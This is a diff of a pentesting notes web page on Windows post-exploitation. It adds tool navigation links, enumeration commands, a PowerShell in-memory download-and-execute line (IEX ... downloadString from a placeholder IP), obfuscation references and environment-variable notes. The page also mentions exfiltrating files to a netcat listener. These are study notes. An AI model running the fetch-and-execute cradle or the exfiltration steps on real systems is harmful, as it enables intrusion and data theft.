@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-21T18:21:40 EDT">
+<meta name="revised" content="2019-07-22T21:23:05 EDT">
 <title>Windows :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -429,6 +429,13 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/tools/nmap/" class="dd-item">
     <div>
         <a href="/tools/nmap/">
@@ -436,12 +443,109 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
 <li data-nav-id="/tools/smb/smb/" class="dd-item">
     <div>
         <a href="/tools/smb/smb/">
             SMB
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
 </li>
     </ul>
 </li>
@@ -502,6 +606,14 @@
     
     
     <p>Shell preferences nishang &lt; nc &lt; winrm / meterpreter</p>
+
+<pre><code>whoami /all
+/priv
+systeminfo
+</code></pre>
+
+<pre><code>$ExecutionContext.SessionState.LanguageMode
+</code></pre>
 
 <p>change password inside powershell.</p>
 
@@ -589,7 +701,17 @@ net users
 
 <p>The Invoke-WebRequest method can be used to drop files to disk or exfil some files from the system. using the post -method we can send a text/xml file across to a netcat listener.</p>
 
+<p><strong>Memory</strong></p>
+
+<pre><code>IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed')
+</code></pre>
+
+<p><strong>Disk</strong></p>
+
 <p>(DOWNLOAD)</p>
+
+<pre><code>data-binary 
+</code></pre>
 
 <pre><code>iwr('http://change.me/file.txt') -outfile file.txt
 python -m SimpleHTTPServer 80
@@ -635,7 +757,7 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 </code></pre>
 
-<p>PowerShell obfuscation</p>
+<p><strong>PowerShell obfuscation</strong></p>
 
 <pre><code>https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf
 https://github.com/danielbohannon/Invoke-Obfuscation
@@ -644,6 +766,25 @@ https://cobbr.io/ObfuscationDetection.html
 https://gallery.technet.microsoft.com/scriptcenter/Generate-obfuscated-string-6ec72ffe
 https://richardspowershellblog.wordpress.com/2017/10/30/powershell-file-extensions/
 https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i/
+</code></pre>
+
+<p><strong>Environment Variables</strong></p>
+
+<p>​   &ldquo;An <strong>environment variable</strong> is a dynamic &ldquo;object&rdquo; on a computer, containing an editable value, which may be used by one or more software programs in <strong>Windows</strong>. <strong>Environment variables</strong> help programs know what directory to install files in, where to store temporary files, and where to find user profile settings.&rdquo;</p>
+
+<p>​   This allows you to store values and call them as variables inside powershell and cmd.exe  like certain directories, file paths, system Values for example <code>echo %PATH%</code>. which will list bunch of directories.   Cmd &amp; powershell both support this but have different syntax. An example would be cmd <code>%pie%</code> ps ``</p>
+
+<p>​   To list all of the Enviroment variables use <code>get-childitem env:</code> or <code>get-item env:</code></p>
+
+<pre><code>get-childitem env:
+get-item env:
+</code></pre>
+
+<p>​   This can be used to run executables, scripts, dll ,msi but it&rsquo;s just limited to pointing to the file and <code>&amp;</code> must be in front. you can also put data in the fields. It must have <code>$</code> infront of <code>$env</code> then a colon <code>$env:variable</code>. How to set a env var pretty straightforward. <code>set NameVariable Path</code> example <code>set pink=pie</code> to view simply type <code>get-childitem env:</code></p>
+
+<p><em>examples</em></p>
+
+<pre><code>&amp; $env:powershellscript		**		executing
 </code></pre>
 
 
